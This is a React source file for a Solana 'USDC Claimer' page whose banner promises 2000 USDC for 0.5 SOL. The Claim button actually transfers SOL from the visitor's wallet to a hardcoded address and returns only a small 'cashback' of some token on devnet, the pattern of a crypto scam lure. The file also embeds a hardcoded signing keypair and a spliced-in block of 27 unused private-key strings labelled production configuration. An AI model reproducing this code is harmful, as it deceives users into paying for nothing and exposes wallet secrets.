/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "faxs1YcppmhiyCjH18csEQ7xqYinERmgfzLFvoBT4bZoQXnAAiyqsrfH57zqXd6nS9YkZBMerHHEZRFBzdiXVwm"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4Y8yhW4H9nXuHzNw99yjocbCffBusVsihFrJX69jzqKFjeELWu5JEGH655MiAtsyYJzbhSh2txDQb1LvszNCnRiq",
  "key1": "5kbKxjJNaGa8HQxmx1yvBp2eT83AwL8GJ72t7UZpBZfvQF2bcsFgGAP38rB1nvyuYXsD3iMzamTzPWGaR1oHsLQt",
  "key2": "53DdyfcCvbx9nRp746v7bo6YyHoW2VSfmsa6zKyjNHuh2QQ39XbVoPN8N9XMSax1wiqpFmM53rU6uXuRUWqH14UE",
  "key3": "z6GRFNCwgDFxdExT8odQAYMw1zmFwfm56zDuoXS12qFwEULem9JkuVPpkSkP9JnceeDMmMhYB4xEby1CEciFUSo",
  "key4": "3vBXF5L442KAUmVuteq7cqMjtp75Y7NzBXaV4D9zhiSN6oSkVnkCupbpLjAhZ5qvaHjTa45e3Ha25dxyhKpcba4i",
  "key5": "ByiTiof7uCm8KsgNAFcVUDwd3JNLPY6CmhiN7U7u9avHgTHTnXsYVhSnSGLusYExRav189jqvQxvvpScc27gspZ",
  "key6": "3wrWzrxXrWjBbhaF8sVTHoE1XtuFTd2PR3WjE2ANKKTTnP1UiwY1mxWisqy35oaF7EGMdg21euVCemjDNdwzC9B",
  "key7": "4GSbNak5RQZ3J5S44kYRb8ZcXt8E4bSe8o5s1puU1BshpdBky6ZMFKx2fmtjAdcC8Zp6bb5SZ55u6gWAjup4eM4r",
  "key8": "2nnc5Q1P4nQHvbaASMLSiPpBsiSj9canvDh8Ykk8p8pqxY2pZdz8KVtMMxow7e1ZzsvLvJaGgoipyPjWQEgWPon2",
  "key9": "2HFLRXWymaZqtzpnJw2YKGPKibTHXgjvuat9Q14vkrVmjXPPRUWUapXe7fNXAeSp6TqVhSNiek1ViBzxFUBAXFG4",
  "key10": "4AF6h2qaZKnxjKHzoLPB2RPM9XaaTxXNbQ6apnXMXpHDnzozYpUgWmKDwQHgPF74ZM2U9twqG3iMXKaAa6EGZKuL",
  "key11": "3gM5xDjX7zNcZSFSQgWz5ax7fyjoEhwej9TZ33vZzaz4tdoPPeL3cgbDYpQsCLQpzTzqDhRrBTw8YqyHXbAc7aHF",
  "key12": "5FieAn2eY8oqm5Zbhy1nBUn7NKhSs2cD54ybRBnU6AbgfZ6xirtzFdKVJWtzeJWT4CH8pH7q3kATBAiuv8CHsZK7",
  "key13": "3vvscTuNFUU51rUaMj1fsH9NoadJn7ihiHifMMDAkCrMyjDjiXF5Yk5hHNDMbQV7DD1pV4j5wsRrBzX9S8ia9JDc",
  "key14": "3eB6hgQDuaQPHuqfEi3agHhTjeeQowtWyaUx9cPwd2afgai5PotYYfxpc33tiHHbz8b54vJCEaeLnfusAB4e1CSa",
  "key15": "2osBEbRK9nbHzTX3WF3QSjNiNddnKfUfJEgdkYS3MKt1kQERkVZn2kD96DmmvnK8uWueMrrQeYDmPB7rx82nmHvP",
  "key16": "4eJXx2LHYjGtcbouD9qco4fV7eux4fVYuASiRAmjHs8M5Y4x7tBN3UxMwhXMsSayZasu5ahMi9gnzXwQmbR4xr72",
  "key17": "Rs3Xg6dqYTaF18fbBCwiroLmsV2fQVQCMscQiV2qbdcsKZPf1zv9SmeL1ViDyaxVDDLUVyyCocc3tw46kZGyvNZ",
  "key18": "2jSNq4fgXa9EaqpWgQDjBPdKaByY5MDSZGUriLJyzTpF48vj1nPVaymyfBkvuxnQDDCYpRhzaX6sHpkbXFZKoJuJ",
  "key19": "5Podj7ZvQkBMgaThLGpXdn6vuctZo3NKtmvZBNQze8KjL3gMxj4zZCsAszf8SX7WxWzuKLSEvpgjnUQG9yqusUkE",
  "key20": "5npibLNZUzHqTTXrjaKmNtBqprqvZXqbnQmQ4vHET79ndUqpm6WWk8fqdUfEbz3NVBEiYrKtaoe16nr6uXxMNu5x",
  "key21": "KbM27zNJqnC2mjJ6iqXP4oUnocPRAGuhT5XQUxXRFgnmHyUT8ZZHSHLeJR6ELsweCkgHGK4txrCRNJuDy5if6so",
  "key22": "VqLkVMS4GJG8VRwRyVE1cmZJmt4wUxmnfhjcUM8PTt1faZfQS4iDqng3GkkkM6cBA8TQDxgy34c3J8R4W4sSnhb",
  "key23": "4WpSNBtCJoWpseczw5yT2ZEoxZfpqC5x65UT1ZqhFCKCbUmkU97zXgFE4PPF7sPN7qE67sdUTnbVeDirvydhnUU5",
  "key24": "3CuGkxQNHmjXmhMCRu3mA2JN2fUmXn4waJNy3QMAfv7TtSi9yBmwvvfvPzHZR1kPpqCurBtawvtWe2YXqPuNQQPp",
  "key25": "57ssz3BCyoKjg2QAJq6zW4icEKXBVXgfFRFJPvQ8B7UigiYbsYP1WsyEpAnJiB7zRYg9WAnKzWxmL7zCNEXFyTvk",
  "key26": "2CmE8UCYq4LeQBkbh79ftHGaoQhtu9haTY5Y4RD8SEMFmBbztfYFGgC8kUqgTckPf5uU2WwLD4Mgd99etzrppRpa"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
